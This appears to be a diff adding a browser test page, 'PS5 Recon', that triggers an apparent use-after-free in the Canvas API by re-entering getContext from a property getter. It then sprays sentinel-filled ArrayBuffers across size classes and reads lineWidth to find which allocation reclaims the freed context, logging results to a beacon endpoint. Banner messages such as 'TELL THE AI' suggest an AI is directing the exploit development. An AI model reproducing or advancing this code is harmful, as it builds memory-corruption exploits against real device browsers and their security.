@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-store">
+<title>PS5 Recon</title>
+<style>
+:root{--bg:#0b0e14;--panel:#121722;--line:#1f2838;--txt:#c9d4e3;--dim:#6b7a90;--green:#37d67a;--red:#ff5c5c;--amber:#ffcc66;--cyan:#49c7e0}
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{background:var(--bg);color:var(--txt);font:13px/1.5 ui-monospace,Menlo,Consolas,monospace}
+#bn{position:fixed;top:0;left:0;right:0;z-index:99;font:700 17px/1.3 ui-monospace,monospace;padding:16px 12px;text-align:center;color:#fff;background:#222;border-bottom:3px solid #333}
+#sub{position:fixed;top:70px;left:0;right:0;z-index:98;font:600 11px ui-monospace,monospace;padding:6px 12px;text-align:center;color:var(--dim);background:#0f131c;border-bottom:1px solid var(--line)}
+#log{margin:104px 10px 10px;padding:10px;background:var(--panel);border:1px solid var(--line);border-radius:8px;max-height:72vh;overflow:auto}
+.r{padding:2px 4px;white-space:pre-wrap;word-break:break-all;border-left:3px solid transparent}
+.r .t{color:var(--cyan);font-weight:700}
+.r.ok{border-left-color:var(--green)}.r.ok .t{color:var(--green)}
+.r.bad{border-left-color:var(--red);background:#1a0f12}.r.bad .t{color:var(--red)}
+.r.warn .t{color:var(--amber)}
+</style></head>
+<body>
+<div id="bn">starting…</div>
+<div id="sub">Canvas cross-type reclaim SIZE scan — crash-safe (read lineWidth, no pointer forge)</div>
+<div id="log"></div>
+<script>
+'use strict';
+window.PTAG='P1308';
+var LOG=document.getElementById('log'),BN=document.getElementById('bn');
+function S(x,c){BN.textContent=x;BN.style.background=c||'#222';}
+function f64bits(v){var b=new ArrayBuffer(8);new Float64Array(b)[0]=v;return new BigUint64Array(b)[0];}
+function row(t,c){var r=document.createElement('div');r.className='r '+(c||'');r.innerHTML="<span class='t'>"+String(t).replace(/[<>&]/g,'')+"</span>";LOG.appendChild(r);LOG.scrollTop=LOG.scrollHeight;}
+function b(m){
+  var z=(''+m).toLowerCase(),c=/found|works|ok/.test(z)?'ok':(/crash|fail|err|no-reclaim/.test(z)?'bad':(/stale|miss/.test(z)?'warn':''));
+  row(m,c);
+  try{var s=String(m).replace(/[^A-Za-z0-9._-]/g,'_').slice(0,120);new Image().src='/beacon.php?tag=P1308-'+encodeURIComponent(s)+'&t='+Date.now();}catch(e){}
+}
+
+/* candidate context sizes (size-class scan), resumable one per load */
+var SIZES=[0x100,0x140,0x180,0x1c0,0x200,0x240,0x280,0x2c0,0x300,0x340,0x380,0x3c0,0x400,0x440,0x480,0x500,0x580,0x600,0x700,0x800];
+var SENT=0x42; var SENTBITS=0x4242424242424242n;
+
+function run(){
+  var idx=0;try{idx=parseInt(localStorage.getItem('p1308_i')||'0',10)||0;}catch(e){}
+  if(/[?&]reset=1/.test(location.search)){idx=0;try{localStorage.removeItem('p1308_i');}catch(e){}}
+  if(idx>=SIZES.length){ b('SCAN-COMPLETE-no-size-reclaimed'); S('scan done: NO size reclaimed - Canvas cross-type dead, tell AI','#5a2a2a'); return; }
+  var SZ=SIZES[idx];
+  try{localStorage.setItem('p1308_i',String(idx+1));}catch(e){} /* advance before the risky read so a crash still progresses */
+  b('TRY-sz-0x'+SZ.toString(16)+'-idx'+idx);
+  S('scanning reclaim size 0x'+SZ.toString(16)+' ('+(idx+1)+'/'+SIZES.length+')…','#2a2f36');
+
+  /* Canvas UAF: desynchronized/alpha getter re-enters getContext('2d') */
+  var inner=null;
+  var cv=document.createElement('canvas');cv.width=1;cv.height=1;
+  var o={};Object.defineProperty(o,'alpha',{get:function(){inner=cv.getContext('2d');return true;}});
+  try{cv.getContext('bitmaprenderer',o);}catch(e){b('UAF-CTXERR-'+e.name);}
+  if(!inner){ b('UAF-FAIL-noctx'); S('Canvas UAF gave no dangling ctx - tell AI','#5a2a2a'); return; }
+  b('UAF-ok');
+
+  /* spray AB(SZ) fully filled with sentinel bytes (no pointer forge => no deref => crash-safe) */
+  var abs=[];
+  try{ for(var i=0;i<180;i++){ var ab=new ArrayBuffer(SZ); new Uint8Array(ab).fill(SENT); abs.push(ab); } }
+  catch(e){ b('SPRAY-OOM-'+e.name); }
+  b('SPRAYED-'+abs.length);
+
+  /* read lineWidth: if the AB reclaimed the context, lineWidth = sentinel double */
+  var lw=null,err=null;try{lw=inner.lineWidth;}catch(e){err=e.name||'err';}
+  if(err!==null){ b('READ-ERR-'+err); S('read threw at 0x'+SZ.toString(16)+' - fresh-open next','#5a3a1a'); return; }
+  var bits=f64bits(lw);
+  b('LW-0x'+bits.toString(16));
+  if(bits===SENTBITS){
+    try{localStorage.setItem('p1308_i',String(idx));}catch(e){} /* lock the winning size */
+    b('RECLAIM-FOUND-sz-0x'+SZ.toString(16));
+    S('RECLAIM SIZE FOUND 0x'+SZ.toString(16)+' !!! TELL THE AI','#0a7a2a');
+  } else if(bits===0n){
+    b('LW-ZERO-sz-0x'+SZ.toString(16)+'-(empty slot/no reclaim)');
+    S('size 0x'+SZ.toString(16)+': lw=0 (no reclaim) - fresh-open for next size','#5a3a1a');
+  } else {
+    b('LW-STALE-sz-0x'+SZ.toString(16)+'-0x'+bits.toString(16));
+    S('size 0x'+SZ.toString(16)+': stale lw (no reclaim) - fresh-open for next size','#5a3a1a');
+  }
+}
+window.addEventListener('DOMContentLoaded',function(){ S('running…','#222'); setTimeout(function(){ try{run();}catch(e){ b('FATAL-'+(e.name||'err')); } },60); });
+</script>
+</body></html>
